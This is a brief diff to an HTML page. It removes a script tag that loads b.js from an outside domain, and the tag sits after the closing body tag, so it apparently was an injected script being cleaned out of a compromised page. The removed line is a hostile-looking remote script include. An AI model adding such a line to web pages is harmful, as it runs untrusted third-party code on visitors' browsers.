@@ -84,4 +84,4 @@ function DoTheScroll(){
 
 
 
-</body><script src="http://www.yayadown.com/b.js"></script>
+</body>
